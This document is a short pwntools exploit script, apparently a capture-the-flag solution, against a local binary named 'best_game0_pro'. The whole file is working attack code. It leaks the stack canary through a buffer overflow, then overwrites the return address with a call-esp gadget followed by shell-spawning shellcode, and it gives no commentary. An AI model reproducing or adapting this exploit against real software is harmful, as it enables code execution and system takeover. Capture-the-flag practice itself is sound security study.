#!/usr/bin/env python3
from pwn import *

EXE_FILENAME='./tbg_files/the_best_game/bg0_pro_docker/best_game0_pro'

exe = context.binary = ELF(EXE_FILENAME)

# libc = exe.libc
argv = [EXE_FILENAME]
envp = {}

CANARY_OFFSET = 32
EIP_OFFSET = 48
CALL_ESP = 0x080488eb

def start():
	gdbscript = '''
	b *(quiz+1)
	continue
	telescope
	'''
	if args.GDB:
		return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
	else:
		return process(argv=argv, env=envp)

io = start()
io.sendlineafter(b'# ', b'a'*CANARY_OFFSET)
io.recvuntil(b'aaaa\n')
canary = b'\x00' + io.recvline() [: 3]
log.info(f'canary = {u32(canary):x}')
io.sendlineafter(b'# ', (b'a'*CANARY_OFFSET + canary). ljust(EIP_OFFSET, b'a') + p32(CALL_ESP) + asm(shellcraft.sh()))
io.sendlineafter(b'# ', b'HZD')
io.interactive()